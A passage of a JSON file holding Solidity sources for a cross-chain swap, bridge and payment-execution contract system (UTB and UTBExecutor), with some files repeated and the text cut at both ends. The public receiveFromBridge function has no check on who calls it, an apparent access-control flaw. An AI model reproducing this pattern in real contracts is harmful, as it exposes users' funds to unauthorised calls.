bridge token is native, and approves the bridge adapter to transfer ERC20 if required.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     * @param amt2Bridge The amount of the bridge token being transferred to the bridge adapter.\n     */\n    function approveAndCheckIfNative(\n        BridgeInstructions memory instructions,\n        uint256 amt2Bridge\n    ) private returns (bool) {\n        IBridgeAdapter bridgeAdapter = IBridgeAdapter(bridgeAdapters[instructions.bridgeId]);\n        address bridgeToken = bridgeAdapter.getBridgeToken(\n            instructions.additionalArgs\n        );\n        if (bridgeToken != address(0)) {\n            IERC20(bridgeToken).approve(address(bridgeAdapter), amt2Bridge);\n            return false;\n        }\n        return true;\n    }\n\n    /**\n     * @dev Transfers fees from the sender to UTB, and finally to the Fee Collector.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param packedInfo The fees and swap instructions which were used to generate the signature.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    modifier retrieveAndCollectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes calldata signature\n    ) {\n        if (address(feeCollector) != address(0)) {\n            uint value = 0;\n            if (fees.feeToken != address(0)) {\n                IERC20(fees.feeToken).transferFrom(\n                    msg.sender,\n                    address(this),\n                    fees.feeAmount\n                );\n                IERC20(fees.feeToken).approve(\n                    address(feeCollector),\n                    fees.feeAmount\n                );\n            } else {\n                value = fees.feeAmount;\n            }\n            feeCollector.collectFees{value: value}(fees, packedInfo, signature);\n        }\n        _;\n    }\n\n    /**\n     * @dev Bridges funds in native or ERC20 and a payment transaction payload to the destination chain\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    function bridgeAndExecute(\n        BridgeInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n        returns (bytes memory)\n    {\n        (\n            uint256 amt2Bridge,\n            BridgeInstructions memory updatedInstructions\n        ) = swapAndModifyPostBridge(instructions);\n        return callBridge(amt2Bridge, fees.bridgeFee, updatedInstructions);\n    }\n\n    /**\n     * @dev Calls the bridge adapter to bridge funds, and approves the bridge adapter to transfer ERC20 if required.\n     * @param amt2Bridge The amount of the bridge token being bridged via the bridge adapter.\n     * @param bridgeFee The fee being transferred to the bridge adapter and finally to the bridge.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     */\n    function callBridge(\n        uint256 amt2Bridge,\n        uint bridgeFee,\n        BridgeInstructions memory instructions\n    ) private returns (bytes memory) {\n        bool native = approveAndCheckIfNative(instructions, amt2Bridge);\n        return\n            IBridgeAdapter(bridgeAdapters[instructions.bridgeId]).bridge{\n                value: bridgeFee + (native ? amt2Bridge : 0)\n            }(\n                amt2Bridge,\n                instructions.postBridge,\n                instructions.dstChainId,\n                instructions.target,\n                instructions.paymentOperator,\n                instructions.payload,\n                instructions.additionalArgs,\n                instructions.refund\n            );\n    }\n\n    /**\n     * @dev Receives funds from the bridge adapter, executes a swap, and executes a payment transaction.\n     * @param postBridge The swapper ID and calldata to execute a swap.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA which initiated the transaction.\n     */\n    function receiveFromBridge(\n        SwapInstructions memory postBridge,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) public {\n        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);\n    }\n\n    /**\n     * @dev Registers and maps a swapper to a swapper ID.\n     * @param swapper The address of the swapper.\n     */\n    function registerSwapper(address swapper) public onlyOwner {\n        ISwapper s = ISwapper(swapper);\n        swappers[s.getId()] = swapper;\n    }\n\n    /**\n     * @dev Registers and maps a bridge adapter to a bridge adapter ID.\n     * @param bridge The address of the bridge adapter.\n     */\n    function registerBridge(address bridge) public onlyOwner {\n        IBridgeAdapter b = IBridgeAdapter(bridge);\n        bridgeAdapters[b.getId()] = bridge;\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n}"
    },
    {
      "filename": "src/UTB.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {SwapParams} from \"./swappers/SwapParams.sol\";\nimport {IUTBExecutor} from \"./interfaces/IUTBExecutor.sol\";\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\nimport {IWETH} from \"decent-bridge/src/interfaces/IWETH.sol\";\nimport {IUTBFeeCollector} from \"./interfaces/IUTBFeeCollector.sol\";\nimport {IBridgeAdapter} from \"./interfaces/IBridgeAdapter.sol\";\nimport {ISwapper} from \"./interfaces/ISwapper.sol\";\nimport {SwapInstructions, FeeStructure, BridgeInstructions, SwapAndExecuteInstructions} from \"./CommonTypes.sol\";\n\n\ncontract UTB is Owned {\n    constructor() Owned(msg.sender) {}\n\n    IUTBExecutor executor;\n    IUTBFeeCollector feeCollector;\n    IWETH wrapped;\n    mapping(uint8 => address) public swappers;\n    mapping(uint8 => address) public bridgeAdapters;\n\n    /**\n     * @dev Sets the executor.\n     * @param _executor The address of the executor.\n     */\n    function setExecutor(address _executor) public onlyOwner {\n        executor = IUTBExecutor(_executor);\n    }\n\n    /**\n     * @dev Sets the wrapped native token.\n     * @param _wrapped The address of the wrapped token.\n     */\n    function setWrapped(address payable _wrapped) public onlyOwner {\n        wrapped = IWETH(_wrapped);\n    }\n\n    /**\n     * @dev Sets the fee collector.\n     * @param _feeCollector The address of the fee collector.\n     */\n    function setFeeCollector(address payable _feeCollector) public onlyOwner {\n        feeCollector = IUTBFeeCollector(_feeCollector);\n    }\n\n    /**\n     * @dev Performs a swap with a default setting to retrieve ERC20.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions\n    ) private returns (address tokenOut, uint256 amountOut) {\n        return performSwap(swapInstructions, true);\n    }\n\n    /**\n     * @dev Performs a swap with the requested swapper and swap calldata.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param retrieveTokenIn Flag indicating whether to transfer ERC20 for the swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions,\n        bool retrieveTokenIn\n    ) private returns (address tokenOut, uint256 amountOut) {\n        ISwapper swapper = ISwapper(swappers[swapInstructions.swapperId]);\n\n        SwapParams memory swapParams = abi.decode(\n            swapInstructions.swapPayload,\n            (SwapParams)\n        );\n\n        if (swapParams.tokenIn == address(0)) {\n            require(msg.value >= swapParams.amountIn, \"not enough native\");\n            wrapped.deposit{value: swapParams.amountIn}();\n            swapParams.tokenIn = address(wrapped);\n            swapInstructions.swapPayload = swapper.updateSwapParams(\n                swapParams,\n                swapInstructions.swapPayload\n            );\n        } else if (retrieveTokenIn) {\n            IERC20(swapParams.tokenIn).transferFrom(\n                msg.sender,\n                address(this),\n                swapParams.amountIn\n            );\n        }\n\n        IERC20(swapParams.tokenIn).approve(\n            address(swapper),\n            swapParams.amountIn\n        );\n\n        (tokenOut, amountOut) = swapper.swap(swapInstructions.swapPayload);\n\n        if (tokenOut == address(0)) {\n            wrapped.withdraw(amountOut);\n        }\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param instructions The token swap data and payment transaction payload.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    function swapAndExecute(\n        SwapAndExecuteInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n    {\n        _swapAndExecute(\n            instructions.swapInstructions,\n            instructions.target,\n            instructions.paymentOperator,\n            instructions.payload,\n            instructions.refund\n        );\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA which initiated the transaction.\n     */\n    function _swapAndExecute(\n        SwapInstructions memory swapInstructions,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) private {\n        (address tokenOut, uint256 amountOut) = performSwap(swapInstructions);\n        if (tokenOut == address(0)) {\n            executor.execute{value: amountOut}(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        } else {\n            IERC20(tokenOut).approve(address(executor), amountOut);\n            executor.execute(\n                target,\n                paymentOperator,\n                payload,\n                tokenOut,\n                amountOut,\n                refund\n            );\n        }\n    }\n\n    /**\n     * @dev Performs the pre bridge swap and modifies the post bridge swap to utilize the bridged amount.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     */\n    function swapAndModifyPostBridge(\n        BridgeInstructions memory instructions\n    )\n        private\n        returns (\n            uint256 amount2Bridge,\n            BridgeInstructions memory updatedInstructions\n        )\n    {\n        (address tokenOut, uint256 amountOut) = performSwap(\n            instructions.preBridge\n        );\n\n        SwapParams memory newPostSwapParams = abi.decode(\n            instructions.postBridge.swapPayload,\n            (SwapParams)\n        );\n\n        newPostSwapParams.amountIn = IBridgeAdapter(\n            bridgeAdapters[instructions.bridgeId]\n        ).getBridgedAmount(amountOut, tokenOut, newPostSwapParams.tokenIn);\n\n        updatedInstructions = instructions;\n\n        updatedInstructions.postBridge.swapPayload = ISwapper(swappers[\n            instructions.postBridge.swapperId\n        ]).updateSwapParams(\n            newPostSwapParams,\n            instructions.postBridge.swapPayload\n        );\n\n        amount2Bridge = amountOut;\n    }\n\n    /**\n     * @dev Checks if the bridge token is native, and approves the bridge adapter to transfer ERC20 if required.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     * @param amt2Bridge The amount of the bridge token being transferred to the bridge adapter.\n     */\n    function approveAndCheckIfNative(\n        BridgeInstructions memory instructions,\n        uint256 amt2Bridge\n    ) private returns (bool) {\n        IBridgeAdapter bridgeAdapter = IBridgeAdapter(bridgeAdapters[instructions.bridgeId]);\n        address bridgeToken = bridgeAdapter.getBridgeToken(\n            instructions.additionalArgs\n        );\n        if (bridgeToken != address(0)) {\n            IERC20(bridgeToken).approve(address(bridgeAdapter), amt2Bridge);\n            return false;\n        }\n        return true;\n    }\n\n    /**\n     * @dev Transfers fees from the sender to UTB, and finally to the Fee Collector.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param packedInfo The fees and swap instructions which were used to generate the signature.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    modifier retrieveAndCollectFees(\n        FeeStructure calldata fees,\n        bytes memory packedInfo,\n        bytes calldata signature\n    ) {\n        if (address(feeCollector) != address(0)) {\n            uint value = 0;\n            if (fees.feeToken != address(0)) {\n                IERC20(fees.feeToken).transferFrom(\n                    msg.sender,\n                    address(this),\n                    fees.feeAmount\n                );\n                IERC20(fees.feeToken).approve(\n                    address(feeCollector),\n                    fees.feeAmount\n                );\n            } else {\n                value = fees.feeAmount;\n            }\n            feeCollector.collectFees{value: value}(fees, packedInfo, signature);\n        }\n        _;\n    }\n\n    /**\n     * @dev Bridges funds in native or ERC20 and a payment transaction payload to the destination chain\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    function bridgeAndExecute(\n        BridgeInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n        returns (bytes memory)\n    {\n        (\n            uint256 amt2Bridge,\n            BridgeInstructions memory updatedInstructions\n        ) = swapAndModifyPostBridge(instructions);\n        return callBridge(amt2Bridge, fees.bridgeFee, updatedInstructions);\n    }\n\n    /**\n     * @dev Calls the bridge adapter to bridge funds, and approves the bridge adapter to transfer ERC20 if required.\n     * @param amt2Bridge The amount of the bridge token being bridged via the bridge adapter.\n     * @param bridgeFee The fee being transferred to the bridge adapter and finally to the bridge.\n     * @param instructions The bridge data, token swap data, and payment transaction payload.\n     */\n    function callBridge(\n        uint256 amt2Bridge,\n        uint bridgeFee,\n        BridgeInstructions memory instructions\n    ) private returns (bytes memory) {\n        bool native = approveAndCheckIfNative(instructions, amt2Bridge);\n        return\n            IBridgeAdapter(bridgeAdapters[instructions.bridgeId]).bridge{\n                value: bridgeFee + (native ? amt2Bridge : 0)\n            }(\n                amt2Bridge,\n                instructions.postBridge,\n                instructions.dstChainId,\n                instructions.target,\n                instructions.paymentOperator,\n                instructions.payload,\n                instructions.additionalArgs,\n                instructions.refund\n            );\n    }\n\n    /**\n     * @dev Receives funds from the bridge adapter, executes a swap, and executes a payment transaction.\n     * @param postBridge The swapper ID and calldata to execute a swap.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA which initiated the transaction.\n     */\n    function receiveFromBridge(\n        SwapInstructions memory postBridge,\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address payable refund\n    ) public {\n        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);\n    }\n\n    /**\n     * @dev Registers and maps a swapper to a swapper ID.\n     * @param swapper The address of the swapper.\n     */\n    function registerSwapper(address swapper) public onlyOwner {\n        ISwapper s = ISwapper(swapper);\n        swappers[s.getId()] = swapper;\n    }\n\n    /**\n     * @dev Registers and maps a bridge adapter to a bridge adapter ID.\n     * @param bridge The address of the bridge adapter.\n     */\n    function registerBridge(address bridge) public onlyOwner {\n        IBridgeAdapter b = IBridgeAdapter(bridge);\n        bridgeAdapters[b.getId()] = bridge;\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n}"
    },
    {
      "filename": "src/UTBExecutor.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\nimport {Owned} from \"solmate/auth/Owned.sol\";\n\ncontract UTBExecutor is Owned {\n    constructor() Owned(msg.sender) {}\n\n    /**\n     * @dev Executes a payment transaction with native OR ERC20.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param token The token being transferred, zero address for native.\n     * @param amount The amount of native or ERC20 being sent with the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA that initiated the transaction.\n     */\n    function execute(\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address token,\n        uint amount,\n        address payable refund\n    ) public payable onlyOwner {\n        return\n            execute(target, paymentOperator, payload, token, amount, refund, 0);\n    }\n\n    /**\n     * @dev Executes a payment transaction with native AND/OR ERC20.\n     * @param target The address of the target contract for the payment transaction.\n     * @param paymentOperator The operator address for payment transfers requiring ERC20 approvals.\n     * @param payload The calldata to execute the payment transaction.\n     * @param token The token being transferred, zero address for native.\n     * @param amount The amount of native or ERC20 being sent with the payment transaction.\n     * @param refund The account receiving any refunds, typically the EOA that initiated the transaction.\n     * @param extraNative Forwards additional gas or native fees required to executing the payment transaction.\n     */\n    function execute(\n        address target,\n        address paymentOperator,\n        bytes memory payload,\n        address token,\n        uint amount,\n        address payable refund,\n        uint extraNative\n    ) public onlyOwner {\n        bool success;\n        if (token == address(0)) {\n            (success, ) = target.call{value: amount}(payload);\n            if (!success) {\n                (refund.call{value: amount}(\"\"));\n            }\n            return;\n        }\n\n        uint initBalance = IERC20(token).balanceOf(address(this));\n\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n        IERC20(token).approve(paymentOperator, amount);\n\n        if (extraNative > 0) {\n            (success, ) = target.call{value: extraNative}(payload);\n            if (!success) {\n                (refund.call{value: extraNative}(\"\"));\n            }\n        } else {\n            (success, ) = target.call(payload);\n        }\n\n        uint remainingBalance = IERC20(token).balanceOf(address(this)) -\n            initBalance;\n\n        if (remainingBalance == 0) {\n            return;\n        }\n\n        IERC20(token).transfer(refund, remainingBalance);\n    }\n}"
    },
    {
      "filename": "src/UTB.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {SwapParams} from \"./swappers/SwapParams.sol\";\nimport {IUTBExecutor} from \"./interfaces/IUTBExecutor.sol\";\nimport {IERC20} from \"forge-std/interfaces/IERC20.sol\";\nimport {IWETH} from \"decent-bridge/src/interfaces/IWETH.sol\";\nimport {IUTBFeeCollector} from \"./interfaces/IUTBFeeCollector.sol\";\nimport {IBridgeAdapter} from \"./interfaces/IBridgeAdapter.sol\";\nimport {ISwapper} from \"./interfaces/ISwapper.sol\";\nimport {SwapInstructions, FeeStructure, BridgeInstructions, SwapAndExecuteInstructions} from \"./CommonTypes.sol\";\n\n\ncontract UTB is Owned {\n    constructor() Owned(msg.sender) {}\n\n    IUTBExecutor executor;\n    IUTBFeeCollector feeCollector;\n    IWETH wrapped;\n    mapping(uint8 => address) public swappers;\n    mapping(uint8 => address) public bridgeAdapters;\n\n    /**\n     * @dev Sets the executor.\n     * @param _executor The address of the executor.\n     */\n    function setExecutor(address _executor) public onlyOwner {\n        executor = IUTBExecutor(_executor);\n    }\n\n    /**\n     * @dev Sets the wrapped native token.\n     * @param _wrapped The address of the wrapped token.\n     */\n    function setWrapped(address payable _wrapped) public onlyOwner {\n        wrapped = IWETH(_wrapped);\n    }\n\n    /**\n     * @dev Sets the fee collector.\n     * @param _feeCollector The address of the fee collector.\n     */\n    function setFeeCollector(address payable _feeCollector) public onlyOwner {\n        feeCollector = IUTBFeeCollector(_feeCollector);\n    }\n\n    /**\n     * @dev Performs a swap with a default setting to retrieve ERC20.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions\n    ) private returns (address tokenOut, uint256 amountOut) {\n        return performSwap(swapInstructions, true);\n    }\n\n    /**\n     * @dev Performs a swap with the requested swapper and swap calldata.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param retrieveTokenIn Flag indicating whether to transfer ERC20 for the swap.\n     */\n    function performSwap(\n        SwapInstructions memory swapInstructions,\n        bool retrieveTokenIn\n    ) private returns (address tokenOut, uint256 amountOut) {\n        ISwapper swapper = ISwapper(swappers[swapInstructions.swapperId]);\n\n        SwapParams memory swapParams = abi.decode(\n            swapInstructions.swapPayload,\n            (SwapParams)\n        );\n\n        if (swapParams.tokenIn == address(0)) {\n            require(msg.value >= swapParams.amountIn, \"not enough native\");\n            wrapped.deposit{value: swapParams.amountIn}();\n            swapParams.tokenIn = address(wrapped);\n            swapInstructions.swapPayload = swapper.updateSwapParams(\n                swapParams,\n                swapInstructions.swapPayload\n            );\n        } else if (retrieveTokenIn) {\n            IERC20(swapParams.tokenIn).transferFrom(\n                msg.sender,\n                address(this),\n                swapParams.amountIn\n            );\n        }\n\n        IERC20(swapParams.tokenIn).approve(\n            address(swapper),\n            swapParams.amountIn\n        );\n\n        (tokenOut, amountOut) = swapper.swap(swapInstructions.swapPayload);\n\n        if (tokenOut == address(0)) {\n            wrapped.withdraw(amountOut);\n        }\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param instructions The token swap data and payment transaction payload.\n     * @param fees The bridge fee in native, as well as utb fee token and amount.\n     * @param signature The ECDSA signature to verify the fee structure.\n     */\n    function swapAndExecute(\n        SwapAndExecuteInstructions calldata instructions,\n        FeeStructure calldata fees,\n        bytes calldata signature\n    )\n        public\n        payable\n        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)\n    {\n        _swapAndExecute(\n            instructions.swapInstructions,\n            instructions.target,\n            instructions.paymentOperator,\n            instructions.payload,\n            instructions.refund\n        );\n    }\n\n    /**\n     * @dev Swaps currency from the incoming to the outgoing token and executes a transaction with payment.\n     * @param swapInstructions The swapper ID and calldata to execute a swap.\n     * @param target The address of the target contract for th"
    }
  ]
}